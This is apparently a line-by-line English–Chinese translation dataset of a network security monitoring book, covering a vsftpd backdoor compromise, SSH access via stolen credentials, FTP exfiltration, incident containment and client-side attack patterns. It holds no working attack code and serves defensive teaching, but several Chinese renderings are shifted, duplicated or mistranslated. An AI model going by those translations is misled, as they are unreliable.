  id: totrans-352
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者 1
- en: 192.168.3.5
  id: totrans-353
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.3.5
- en: 203.0.113.10
  id: totrans-354
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.10
- en: Victim 2
  id: totrans-355
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者 2
- en: 192.168.3.13
  id: totrans-356
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.3.13
- en: 2\. Intruder exploits vsftpd service on Victim 1\.
  id: totrans-357
  prefs: []
  type: TYPE_NORMAL
  zh: 2\. 入侵者利用受害者 1 上的vsftpd服务\。
- en: Victim 1
  id: totrans-358
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者 1
- en: NETWORK CONNECTION
  id: totrans-359
  prefs: []
  type: TYPE_NORMAL
  zh: 网络连接
- en: 192.168.3.5
  id: totrans-360
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.3.5
- en: Intruder 1
  id: totrans-361
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者 1
- en: 203.0.113.10
  id: totrans-362
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.10
- en: Exploited
  id: totrans-363
  prefs: []
  type: TYPE_NORMAL
  zh: 被利用
- en: 3\. Intruder connects to backdoor on Victim 1\.
  id: totrans-364
  prefs: []
  type: TYPE_NORMAL
  zh: 3\. 入侵者连接到受害者 1 上的后门\。
- en: NETWORK CONNECTION
  id: totrans-365
  prefs: []
  type: TYPE_NORMAL
  zh: 网络连接
- en: Intruder 1
  id: totrans-366
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者 1
- en: Victim 1
  id: totrans-367
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者 1
- en: 203.0.113.10
  id: totrans-368
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.10
- en: 192.168.3.5
  id: totrans-369
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.3.5
- en: 4\. Intruder fails to exploit vsftpd service on Victim 2\.
  id: totrans-370
  prefs: []
  type: TYPE_NORMAL
  zh: 4\. 入侵者未能利用受害者 2 上的vsftpd服务\。
- en: NETWORK CONNECTION
  id: totrans-371
  prefs: []
  type: TYPE_NORMAL
  zh: 网络连接
- en: Victim 2
  id: totrans-372
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者 2
- en: Intruder 1
  id: totrans-373
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者 1
- en: 192.168.3.13
  id: totrans-374
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.3.13
- en: 203.0.113.10
  id: totrans-375
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.10
- en: Safe
  id: totrans-376
  prefs: []
  type: TYPE_NORMAL
  zh: 安全
- en: '*Figure 10-13: Stage 1 of server-side compromise*'
  id: totrans-377
  prefs: []
  type: TYPE_NORMAL
  zh: '*图10-13：服务器端入侵的第一阶段*'
- en: Server-side Compromise **231**
  id: totrans-378
  prefs: []
  type: TYPE_NORMAL
  zh: 服务器端入侵 **231**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-379
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 'In stage 1, the intruder at 203.0.113.10 conducted network reconnaissance against
    two computers: 192.168.3.5 and 192.168.3.13\. The intruder'
  id: totrans-380
  prefs: []
  type: TYPE_NORMAL
  zh: 在第一阶段，203.0.113.10上的入侵者对两台计算机进行了网络侦察：192.168.3.5和192.168.3.13。入侵者
- en: found port 21 TCP listening on both systems, so he attempted to compro-
  id: totrans-381
  prefs: []
  type: TYPE_NORMAL
  zh: 发现两台系统都在监听21端口TCP，因此他尝试通过FTP来
- en: mise that service on both targets. He successfully compromised the vsftpd
  id: totrans-382
  prefs: []
  type: TYPE_NORMAL
  zh: 他成功地攻破了vsftpd服务，并在两个目标上都利用了该服务。
- en: server on 192.168.3.5, causing a backdoor to open on port 6200 TCP on
  id: totrans-383
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.3.5上的服务器遭到入侵，导致TCP端口6200打开了后门。
- en: that system. He was not able to use the same technique to gain unauthor-
  id: totrans-384
  prefs: []
  type: TYPE_NORMAL
  zh: 那个系统。他无法使用相同的技术获得未经授权的访问。
- en: ized access to 192.168.3.13\.
  id: totrans-385
  prefs: []
  type: TYPE_NORMAL
  zh: 授权访问192.168.3.13。
- en: '***Summarizing Stage 2***'
  id: totrans-386
  prefs: []
  type: TYPE_NORMAL
  zh: '***总结第二阶段***'
- en: Figure 10-14 summarizes the remainder of this intrusion, called stage 2\.
  id: totrans-387
  prefs: []
  type: TYPE_NORMAL
  zh: 图10-14总结了此入侵的其余部分，称为第二阶段。
- en: 5\. Intruder 2 connects via SSH to Victim 1\.
  id: totrans-388
  prefs: []
  type: TYPE_NORMAL
  zh: 5. 入侵者2通过SSH连接到受害者1。
- en: SSH CONNECTION
  id: totrans-389
  prefs: []
  type: TYPE_NORMAL
  zh: SSH 连接
- en: Intruder 2
  id: totrans-390
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者2
- en: Victim 1
  id: totrans-391
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者1
- en: 203.0.113.77
  id: totrans-392
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.77
- en: 192.168.3.5
  id: totrans-393
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.3.5
- en: 6\. Intruder 2 instructs Victim 1 to upload
  id: totrans-394
  prefs: []
  type: TYPE_NORMAL
  zh: 6. 入侵者2指示受害者1上传
- en: stolen data to FTP server on Intruder 3\.
  id: totrans-395
  prefs: []
  type: TYPE_NORMAL
  zh: 将被盗数据上传到入侵者3的FTP服务器。
- en: SSH CONNECTION
  id: totrans-396
  prefs: []
  type: TYPE_NORMAL
  zh: SSH 连接
- en: Intruder 2
  id: totrans-397
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者2
- en: 203.0.113.77
  id: totrans-398
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.77
- en: Victim 1
  id: totrans-399
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者1
- en: FTP CONNECTION
  id: totrans-400
  prefs: []
  type: TYPE_NORMAL
  zh: FTP连接
- en: 192.168.3.5
  id: totrans-401
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.3.5
- en: Intruder 3
  id: totrans-402
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者3
- en: 203.0.113.4
  id: totrans-403
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.4
- en: '*Figure 10-14: Stage 2 of server-side compromise*'
  id: totrans-404
  prefs: []
  type: TYPE_NORMAL
  zh: '*图10-14：服务器端入侵的第二阶段*'
- en: In stage 2, a new intruder IP address, 203.0.113.77, connects via SSH to
  id: totrans-405
  prefs: []
  type: TYPE_NORMAL
  zh: 在第二阶段，一个新的入侵者IP地址，203.0.113.77，通过SSH连接到
- en: 192.168.3.5\. While interacting with the victim, the intruder created or dis-
  id: totrans-406
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.3.5。与受害者互动时，入侵者创建或删除了某些文件。
- en: covered an archive titled *mysql-ssl.tar.gz*. He then uploaded that archive
    via FTP to a third system, 203.0.113.4, which may be another FreeBSD system.
  id: totrans-407
  prefs: []
  type: TYPE_NORMAL
  zh: 覆盖了一个名为*mysql-ssl.tar.gz*的归档文件。然后，他通过FTP将该归档文件上传到第三台系统，203.0.113.4，该系统可能是另一个FreeBSD系统。
- en: '***Next Steps***'
  id: totrans-408
  prefs: []
  type: TYPE_NORMAL
  zh: '***下一步***'
- en: As explained in Chapter 9, escalation and resolution are the two phases fol-
  id: totrans-409
  prefs: []
  type: TYPE_NORMAL
  zh: 如第9章所述，升级和解决是NSM工作流程中的两个阶段。
- en: lowing the collection and analysis phases of the NSM workflow. With analy-
  id: totrans-410
  prefs: []
  type: TYPE_NORMAL
  zh: 收集和分析阶段之后，NSM工作流程的后续阶段。
- en: sis complete, the CIRT must identify the owners of the affected systems,
  id: totrans-411
  prefs: []
  type: TYPE_NORMAL
  zh: 完成后，CIRT必须确定受影响系统的所有者，
- en: and explain the nature of the data identified as being stolen. In turn, the
  id: totrans-412
  prefs: []
  type: TYPE_NORMAL
  zh: '并解释被识别为被盗数据的性质。反过来， '
- en: asset owner must evaluate the impact of the loss of data and simultaneously
  id: totrans-413
  prefs: []
  type: TYPE_NORMAL
  zh: 资产所有者必须评估数据丢失的影响，并同时考虑
- en: authorize the CIRT to take short-term incident containment measures. The
  id: totrans-414
  prefs: []
  type: TYPE_NORMAL
  zh: 授权CIRT采取短期事件遏制措施时。
- en: most effective containment mechanism involves removing the compromised
  id: totrans-415
  prefs: []
  type: TYPE_NORMAL
  zh: 最有效的遏制机制是从网络中移除被攻破的系统。
- en: systems from the network.
  id: totrans-416
  prefs: []
  type: TYPE_NORMAL
  zh: 网络上的系统。
- en: First, disconnect 192.168.3.5 from the network. We should consider
  id: totrans-417
  prefs: []
  type: TYPE_NORMAL
  zh: 首先，断开192.168.3.5与网络的连接。我们应当考虑
- en: it untrustworthy because we don’t know what the intruder did during
  id: totrans-418
  prefs: []
  type: TYPE_NORMAL
  zh: 它被认为不可信，因为我们不知道入侵者在
- en: his encrypted OpenSSH session. The CIRT should also determine if any
  id: totrans-419
  prefs: []
  type: TYPE_NORMAL
  zh: 他加密的OpenSSH会话。CIRT还应确定是否有任何
- en: information on 192.168.3.5 is sensitive, to help decide whether this event
  id: totrans-420
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.3.5上的信息是敏感的，以帮助决定此事件
- en: qualifies as a Breach 2 or Breach 1 incident. The differentiation lies in the
  id: totrans-421
  prefs: []
  type: TYPE_NORMAL
  zh: 这个事件符合Breach 2或Breach 1事件的标准。区别在于
- en: importance and sensitivity of the stolen data.
  id: totrans-422
  prefs: []
  type: TYPE_NORMAL
  zh: 被盗数据的重大性和敏感性。
- en: '**232** Chapter 10'
  id: totrans-423
  prefs: []
  type: TYPE_NORMAL
  zh: '**232** 第10章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-424
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: The CIRT should determine if any information taken from 192.168.3.5
  id: totrans-425
  prefs: []
  type: TYPE_NORMAL
  zh: CIRT应确定是否从192.168.3.5获取了任何信息
- en: could lead to other intrusions. Are there any accounts that could also be
  id: totrans-426
  prefs: []
  type: TYPE_NORMAL
  zh: 可能导致其他入侵。是否存在其他账户也可能被
- en: used to log in to other Vivian’s Pets systems? Are there configuration files
  id: totrans-427
  prefs: []
  type: TYPE_NORMAL
  zh: 是否用于登录到其他Vivian’s Pets系统？是否有配置文件
- en: that would enable additional access? Are any business partners or custom-
  id: totrans-428
  prefs: []
  type: TYPE_NORMAL
  zh: 这些行为是否会使入侵者获得额外的访问权限？是否有配置文件可以被用来登录到其他“Vivian’s Pets”系统？
- en: ers at risk? Involving the business, legal, and other teams may become
  id: totrans-429
  prefs: []
  type: TYPE_NORMAL
  zh: 是否有企业合作伙伴或客户账户存在风险？可能需要涉及企业、法律和其他团队来应对。
- en: necessary as the CIRT evaluates the impact of the intrusion. Ultimately,
  id: totrans-430
  prefs: []
  type: TYPE_NORMAL
  zh: 在评估入侵影响时，必要时CIRT应采取措施。最终，
- en: 192.168.3.5 should be retired because it is no longer a trustworthy plat-
  id: totrans-431
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.3.5应该被退役，因为它不再是一个可信的平台。
- en: 'form. This could be a hard lesson for the IT and security staff: When the'
  id: totrans-432
  prefs: []
  type: TYPE_NORMAL
  zh: 这是IT和安全人员的一个深刻教训：当
- en: Metasploitable developers warn users to keep their distribution off the
  id: totrans-433
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploitable 开发者警告用户将他们的发行版保密
- en: Internet, they mean it!
  id: totrans-434
  prefs: []
  type: TYPE_NORMAL
  zh: 互联网，他们是认真的！
- en: '**conclusion**'
  id: totrans-435
  prefs: []
  type: TYPE_NORMAL
  zh: '**结论**'
- en: This chapter walked through a server-side compromise. We utilized several
  id: totrans-436
  prefs: []
  type: TYPE_NORMAL
  zh: 本章讲解了服务器端的妥协。我们利用了多个
- en: forms of NSM data to analyze an intrusion targeting two systems in the
  id: totrans-437
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 NSM 数据的不同形式分析入侵，目标是两台系统
- en: Vivian’s Pets test network. By examining alert, session, full content, transac-
  id: totrans-438
  prefs: []
  type: TYPE_NORMAL
  zh: Vivian's Pets 测试网络的应用程序。通过检查警报、会话、完整内容、事务-
- en: tion, and extracted content data, we learned that an intruder stole system
  id: totrans-439
  prefs: []
  type: TYPE_NORMAL
  zh: 通过提取信息和内容数据，我们了解到入侵者窃取了系统的
- en: information and a compressed archive associated with MySQL.
  id: totrans-440
  prefs: []
  type: TYPE_NORMAL
  zh: 与 MySQL 相关的信息和压缩归档文件。
- en: We also learned that NSM data can’t answer every question by itself.
  id: totrans-441
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还了解到，NSM 数据本身无法回答所有问题。
- en: Once the intruder leveraged stolen credentials (via the */etc/passwd* and */etc/*
  id: totrans-442
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦入侵者利用被盗凭证（通过 */etc/passwd* 和 */etc/*
- en: '*shadow* files) to connect via OpenSSH, we couldn’t see the commands he ran,'
  id: totrans-443
  prefs: []
  type: TYPE_NORMAL
  zh: '*shadow* 文件）通过 OpenSSH 连接时，我们无法看到他运行的命令，'
- en: although we could see derivative actions like uploading an archive via FTP.
  id: totrans-444
  prefs: []
  type: TYPE_NORMAL
  zh: 虽然我们可以看到诸如通过 FTP 上传归档的派生行为。
- en: Using an NSM tool bundled with Sguil, we rebuilt the stolen archive,
  id: totrans-445
  prefs: []
  type: TYPE_NORMAL
  zh: 使用与 Sguil 捆绑的 NSM 工具，我们重建了被盗的归档文件，
- en: although we could have done the same sort of reassembly using Wireshark
  id: totrans-446
  prefs: []
  type: TYPE_NORMAL
  zh: 虽然我们本可以使用 Wireshark 做类似的重组
- en: or another tool.
  id: totrans-447
  prefs: []
  type: TYPE_NORMAL
  zh: 或者其他工具。
- en: This case introduced the idea of patterns of attack and how to analyze
  id: totrans-448
  prefs: []
  type: TYPE_NORMAL
  zh: 本案例介绍了攻击模式的概念以及如何分析
- en: them using NSM tools and methods. In the next chapter, we’ll turn the
  id: totrans-449
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 NSM 工具和方法处理它们。在下一章中，我们将转到
- en: tables slightly and review a client-side compromise.
  id: totrans-450
  prefs: []
  type: TYPE_NORMAL
  zh: 稍微调整表格并回顾一下客户端妥协。
- en: Server-side Compromise **233**
  id: totrans-451
  prefs: []
  type: TYPE_NORMAL
  zh: 服务器端妥协 **233**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-452
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-453
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**11**'
  id: totrans-454
  prefs: []
  type: TYPE_NORMAL
  zh: '**11**'
- en: '**c l i e N T- S i D e c o M P r o M i S e**'
  id: totrans-455
  prefs: []
  type: TYPE_NORMAL
  zh: '**C L I E N T - S I D E C O M P R O M I S E**'
- en: In the previous chapter’s examples,
  id: totrans-456
  prefs: []
  type: TYPE_NORMAL
  zh: 在上一章的示例中，
- en: an intruder conducted reconnaissance
  id: totrans-457
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者进行侦察
- en: against remote targets, identified services,
  id: totrans-458
  prefs: []
  type: TYPE_NORMAL
  zh: 针对远程目标，识别的服务，
- en: and attacked them. After gaining access to
  id: totrans-459
  prefs: []
  type: TYPE_NORMAL
  zh: 并攻击它们。获取访问权限后
- en: one system with a vulnerable service, the intruder
  id: totrans-460
  prefs: []
  type: TYPE_NORMAL
  zh: 拥有一个易受攻击服务的系统，入侵者
- en: archived files of interest and exfiltrated them to a
  id: totrans-461
  prefs: []
  type: TYPE_NORMAL
  zh: 将感兴趣的归档文件提取到一个
- en: remote server. All of this activity took place without
  id: totrans-462
  prefs: []
  type: TYPE_NORMAL
  zh: 远程服务器。所有这些活动都在没有
- en: the explicit involvement of a user on the Vivian’s Pets
  id: totrans-463
  prefs: []
  type: TYPE_NORMAL
  zh: 用户在 Vivian's Pets 上的明确参与
- en: network.
  id: totrans-464
  prefs: []
  type: TYPE_NORMAL
  zh: 网络。
- en: This chapter demonstrates a client-side compromise—one of the other
  id: totrans-465
  prefs: []
  type: TYPE_NORMAL
  zh: 本章展示了客户端妥协——另一种常见的
- en: major categories of malicious network activity you are likely to encounter.
  id: totrans-466
  prefs: []
  type: TYPE_NORMAL
  zh: 你可能会遇到的恶意网络活动的主要类别之一。
- en: Although this incident involves remote systems, the intruder does not initiate
  id: totrans-467
  prefs: []
  type: TYPE_NORMAL
  zh: 虽然此事件涉及远程系统，但入侵者并未主动发起
- en: the attack in the same manner as in a server-side compromise. We will use
  id: totrans-468
  prefs: []
  type: TYPE_NORMAL
  zh: 以与服务器端妥协相同的方式进行攻击。我们将使用
- en: similar NSM methodologies to detect and respond to the intrusion.
  id: totrans-469
  prefs: []
  type: TYPE_NORMAL
  zh: 使用类似的 NSM 方法来检测和响应入侵。
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-470
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**client-side compromise defined**'
  id: totrans-471
  prefs: []
  type: TYPE_NORMAL
  zh: '**客户端妥协定义**'
- en: '*Client-side compromise* involves an intruder exploiting an application with'
  id: totrans-472
  prefs: []
  type: TYPE_NORMAL
  zh: '*客户端妥协* 是指入侵者利用带有'
- en: which a user interacts. This application could be a web browser, email client,
  id: totrans-473
  prefs: []
  type: TYPE_NORMAL
  zh: 用户交互的应用程序。这个应用程序可以是网页浏览器、电子邮件客户端、
- en: media player, or any other program that users rely on for access to network
  id: totrans-474
  prefs: []
  type: TYPE_NORMAL
  zh: 媒体播放器或任何其他程序，用户依赖这些程序访问网络
- en: resources. An attacker might trick a user into visiting a compromised site
  id: totrans-475
  prefs: []
  type: TYPE_NORMAL
  zh: 资源。攻击者可能会诱使用户访问一个被入侵的网站
- en: and revealing her credentials, or he might simply position himself to take
  id: totrans-476
  prefs: []
  type: TYPE_NORMAL
  zh: 并揭示她的凭证，或者他可能会简单地定位自己以窃取
- en: advantage of a routine that the user follows.
  id: totrans-477
  prefs: []
  type: TYPE_NORMAL
  zh: 利用用户的日常操作。
- en: Client-side attacks have been popular since the mid-2000s, when attack-
  id: totrans-478
  prefs: []
  type: TYPE_NORMAL
  zh: 客户端攻击自 2000 年代中期以来一直很流行，当时攻击者
- en: ers realized that if they could convince a user application to execute (or be
  id: totrans-479
  prefs: []
  type: TYPE_NORMAL
  zh: 用户意识到，如果他们能说服一个用户应用程序执行（或被
- en: subject to) malicious code, their attacks would be more likely to succeed.
  id: totrans-480
  prefs: []
  type: TYPE_NORMAL
  zh: 受到）恶意代码攻击的，他们的攻击更可能成功。
- en: Many organizations devote resources and expertise to countering server-side
  id: totrans-481
  prefs: []
  type: TYPE_NORMAL
  zh: 许多组织将资源和专业知识投入到应对服务器端
- en: attacks, but client-side attacks are much more difficult to stop or even detect.
  id: totrans-482
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击，但客户端攻击更难以阻止甚至检测。
- en: Figure 11-1 shows a generic attack pattern for a client-side compromise.
  id: totrans-483
  prefs: []
  type: TYPE_NORMAL
  zh: 图 11-1 展示了一个客户端侧妥协的通用攻击模式。
- en: 1\. Victim executes malicious code on
  id: totrans-484
  prefs: []
  type: TYPE_NORMAL
  zh: 1. 受害者执行恶意代码
- en: system, after being solicited by intruder
  id: totrans-485
  prefs: []
  type: TYPE_NORMAL
  zh: 系统，在被入侵者诱导后
- en: or by innocent computer use.
  id: totrans-486
  prefs: []
  type: TYPE_NORMAL
  zh: 或者是无辜的计算机使用。
- en: PHISHING EMAIL
  id: totrans-487
  prefs: []
  type: TYPE_NORMAL
  zh: 网络钓鱼邮件
- en: Intruder
  id: totrans-488
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者
- en: Victim
  id: totrans-489
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者
- en: OR
  id: totrans-490
  prefs: []
  type: TYPE_NORMAL
  zh: 或
- en: WEBSITE VISIT
  id: totrans-491
  prefs: []
  type: TYPE_NORMAL
  zh: 网站访问
- en: Website hosting
  id: totrans-492
  prefs: []
  type: TYPE_NORMAL
  zh: 网站托管
- en: Victim
  id: totrans-493
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者
- en: malicious code
  id: totrans-494
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意代码
- en: OR
  id: totrans-495
  prefs: []
  type: TYPE_NORMAL
  zh: 或
- en: SOCIAL MEDIA OR OTHER COMMUNICATION
  id: totrans-496
  prefs: []
  type: TYPE_NORMAL
  zh: 社交媒体或其他通信
- en: Malicious code
  id: totrans-497
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意代码
- en: on social media
  id: totrans-498
  prefs: []
  type: TYPE_NORMAL
  zh: 在社交媒体上
- en: Victim
  id: totrans-499
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者
- en: or other site
  id: totrans-500
  prefs: []
  type: TYPE_NORMAL
  zh: 或其他网站
- en: 2\. Attack method exploits vulnerable application
  id: totrans-501
  prefs: []
  type: TYPE_NORMAL
  zh: 2. 攻击方法利用了易受攻击的应用程序
- en: on victim system to execute code or commands,
  id: totrans-502
  prefs: []
  type: TYPE_NORMAL
  zh: 在受害者系统上执行代码或命令，
- en: Exploited
  id: totrans-503
  prefs: []
  type: TYPE_NORMAL
  zh: 被利用
- en: or run an unwanted malicious application.
  id: totrans-504
  prefs: []
  type: TYPE_NORMAL
  zh: 或运行一个不想要的恶意应用程序。
- en: NETWORK CONNECTION
  id: totrans-505
  prefs: []
  type: TYPE_NORMAL
  zh: 网络连接
- en: Intruder
  id: totrans-506
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者
- en: Victim
  id: totrans-507
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者
- en: 3\. Malicious code causes victim to reach back to intruder
  id: totrans-508
  prefs: []
  type: TYPE_NORMAL
  zh: 3. 恶意代码导致受害者回溯到入侵者
- en: '*Figure 11-1: Client-side compromise at ack pat ern*'
  id: totrans-509
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 11-1：客户端妥协攻击模式*'
- en: As you can see in Figure 11-1, three of the most popular client-side attacks
  id: totrans-510
  prefs: []
  type: TYPE_NORMAL
  zh: 如图 11-1 所示，三种最常见的客户端侧攻击
- en: involve phishing email, visiting websites, and interacting with social media.
  id: totrans-511
  prefs: []
  type: TYPE_NORMAL
  zh: 涉及网络钓鱼邮件、访问网站和与社交媒体的互动。
- en: How is this possible?
  id: totrans-512
  prefs: []
  type: TYPE_NORMAL
  zh: 这是怎么可能的？
- en: '**236** Chapter 11'
  id: totrans-513
  prefs: []
  type: TYPE_NORMAL
  zh: '**236** 第 11 章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-514
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: In all three attacks, an intruder creates an unsafe communication of some type.
    With a phishing email message, perhaps the intruder attaches a
  id: totrans-515
  prefs: []
  type: TYPE_NORMAL
  zh: 在这三种攻击中，入侵者创建了某种不安全的通信方式。对于网络钓鱼邮件，可能入侵者附加了一个
- en: malicious executable, such as a document designed to exploit a vulnerable
  id: totrans-516
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意可执行文件，如设计用来利用漏洞的文档
- en: application like Microsoft Word or Adobe Reader. Phishing email messages
  id: totrans-517
  prefs: []
  type: TYPE_NORMAL
  zh: 应用程序，如 Microsoft Word 或 Adobe Reader。网络钓鱼邮件
- en: or social media may also contain links to malicious websites operated by the
  id: totrans-518
  prefs: []
  type: TYPE_NORMAL
  zh: 或社交媒体也可能包含指向恶意网站的链接，这些网站由
- en: intruder specifically to perform attacks. The target site could also be a com-
  id: totrans-519
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者专门执行攻击。目标网站也可能是一个商业网站
- en: pletely legitimate one, such as a news or sports page, where an attacker has
  id: totrans-520
  prefs: []
  type: TYPE_NORMAL
  zh: 完全合法的页面，例如新闻或体育页面，攻击者已在其中
- en: inserted malicious code that compromises those who visit the site.
  id: totrans-521
  prefs: []
  type: TYPE_NORMAL
  zh: 插入的恶意代码让访问该网站的人遭到妥协。
- en: The latest variants of these attacks are called *watering hole* or *strategic
    website compromise* attacks. An intruder compromises a website that she expects
  id: totrans-522
  prefs: []
  type: TYPE_NORMAL
  zh: 这些攻击的最新变种被称为 *watering hole*（水坑攻击）或 *strategic website compromise*（战略性网站妥协）攻击。入侵者会妥协一个她预期
- en: her targets to visit, such as a human rights or think tank site. When interested
  id: totrans-523
  prefs: []
  type: TYPE_NORMAL
  zh: 让目标访问，可能是人权或智库网站。当感兴趣的
- en: parties visit the site, malicious code attacks them without their knowledge.
  id: totrans-524
  prefs: []
  type: TYPE_NORMAL
  zh: 其他方访问该网站时，恶意代码会在他们不知情的情况下攻击他们。
- en: These attacks are fairly devastating because they are not tightly targeted
  id: totrans-525
  prefs: []
  type: TYPE_NORMAL
  zh: 这些攻击相当具有破坏性，因为它们并不完全针对特定目标
- en: (the intruder can’t be sure that her intended prey will visit the website),
  id: totrans-526
  prefs: []
  type: TYPE_NORMAL
  zh: （入侵者不能确定她的目标是否会访问该网站），
- en: but they can be very stealthy because victims surfing the Web normally are
  id: totrans-527
  prefs: []
  type: TYPE_NORMAL
  zh: 但是它们可能非常隐蔽，因为受害者在上网时通常
- en: unwittingly caught in this trap.
  id: totrans-528
  prefs: []
  type: TYPE_NORMAL
  zh: 不经意间陷入了这个陷阱。
- en: Client-side attacks can result in the same levels of access as server-side
  id: totrans-529
  prefs: []
  type: TYPE_NORMAL
  zh: 客户端侧攻击可能导致与服务器端相同的访问级别
- en: attacks (discussed in Chapter 10). An attempt to exploit a vulnerable appli-
  id: totrans-530
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击（在第 10 章中讨论）。利用易受攻击的应用程序的尝试
- en: cation, regardless of whether it succeeds, is a Cat 3 incident. If the attack
  id: totrans-531
  prefs: []
  type: TYPE_NORMAL
  zh: 通信，无论是否成功，都是 Cat 3 级事件。如果攻击
- en: succeeds and the intruder achieves user-level access, the scenario now quali-
  id: totrans-532
  prefs: []
  type: TYPE_NORMAL
  zh: 如果成功并且入侵者获得了用户级别的访问权限，则此场景现在符合
- en: fies as a Cat 2 intrusion. If the intruder gains administrator- or root-level
  id: totrans-533
  prefs: []
  type: TYPE_NORMAL
  zh: 被标记为 Cat 2 类型的入侵。如果入侵者获得了管理员级别或根级别的权限，
- en: privileges, we must deal with a Cat 1 intrusion. Once the intruder estab-
  id: totrans-534
  prefs: []
  type: TYPE_NORMAL
  zh: 权限，我们必须处理 Cat 1 类型的入侵。一旦入侵者建立了连接，
- en: lishes a command-and-control channel, it’s Breach 3\. And if the intruder
  id: totrans-535
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦建立了指挥和控制通道，便是 Breach 3。如果入侵者
- en: begins stealing data or taking other actions, we could be dealing with a
  id: totrans-536
  prefs: []
  type: TYPE_NORMAL
  zh: 开始窃取数据或采取其他行动时，我们可能正在处理一个
- en: Breach 2 or even a Breach 1 intrusion. (See Figure 9-5 o[n page 194](index_split_004.html#p228)
    for intrusion category definitions.) Whatever the category, the goal of the CIRT
  id: totrans-537
  prefs: []
  type: TYPE_NORMAL
  zh: 漏洞 2 或甚至是漏洞 1 类型的入侵。（请参见图 9-5，位于第 194 页 [链接](index_split_004.html#p228)，了解入侵分类定义。）无论是哪种类别，CIRT
    的目标
- en: is, as always, to quickly determine the extent of the incident and to take
  id: totrans-538
  prefs: []
  type: TYPE_NORMAL
  zh: 一如既往，快速确定事件的范围并采取
- en: rapid actions to contain the attack and mitigate risk of data loss, alteration,
  id: totrans-539
  prefs: []
  type: TYPE_NORMAL
  zh: 迅速采取行动以遏制攻击并减少数据丢失、篡改的风险，
- en: or degradation.
  id: totrans-540
  prefs: []
  type: TYPE_NORMAL
  zh: 或退化。
- en: '**client-side compromise in action**'
  id: totrans-541
  prefs: []
  type: TYPE_NORMAL
  zh: '**客户端妥协的实际情况**'
- en: For this chapter’s example, we’ll look at a client-side compromise that takes
  id: totrans-542
  prefs: []
  type: TYPE_NORMAL
  zh: 本章节的例子中，我们将查看一个客户端妥协的情况，
- en: place on the Vivian’s Pets network but involves different computers. To
  id: totrans-543
  prefs: []
  type: TYPE_NORMAL
  zh: 发生在 Vivian’s Pets 网络上的活动，但涉及不同的计算机。为了
- en: make the situation slightly more complicated, the activity in question will
  id: totrans-544
  prefs: []
  type: TYPE_NORMAL
  zh: 让情况稍微复杂一些，相关活动将
- en: be monitored by an NSM sensor watching two segments. This is a configu-
  id: totrans-545
  prefs: []
  type: TYPE_NORMAL
  zh: 通过一个监控两个段落的NSM传感器进行监测。这是一个配置
- en: ration supported by SO and it seems like a good choice when the hardware
  id: totrans-546
  prefs: []
  type: TYPE_NORMAL
  zh: 由 SO 支持的配额，看起来是一个不错的选择，尤其是在硬件
